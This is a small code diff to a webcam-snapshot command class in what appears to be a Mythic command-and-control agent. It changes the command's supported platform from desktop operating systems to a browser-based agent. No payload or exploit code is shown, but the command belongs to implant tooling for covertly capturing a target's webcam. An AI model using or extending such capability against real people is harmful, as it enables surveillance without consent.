@@ -23,7 +23,7 @@ class WebcamSnapCommand(CommandBase):
     argument_class = WebcamSnapArguments
     browser_script = BrowserScript(script_name="webcam_snap", author="@grampae", for_new_ui=True)
     attributes = CommandAttributes(
-        supported_os=[SupportedOS.MacOS, SupportedOS.Linux, SupportedOS.Windows]
+        supported_os=[SupportedOS("Browser")]
     )
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
